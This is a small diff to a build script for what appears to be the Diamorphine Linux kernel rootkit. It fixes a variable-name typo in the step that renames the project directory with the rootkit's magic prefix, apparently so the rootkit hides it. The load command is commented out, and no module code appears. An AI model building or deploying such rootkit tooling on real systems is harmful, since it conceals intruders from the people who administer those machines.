@@ -7,9 +7,9 @@ hFile=diamorphine.h
 if test -f "$koFile"; then #testing if .ko was built properly
     #sudo insmod "$koFile"
     magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
-    thidDirPath=$(pwd)
-    thidDir=${PWD##*/}
-    mv "$thidDirPath" '../'"$magicPrefix""$thisDir"
+    thisDirPath=$(pwd)
+    thisDir=${PWD##*/}
+    mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
 
     echo "built."
 fi
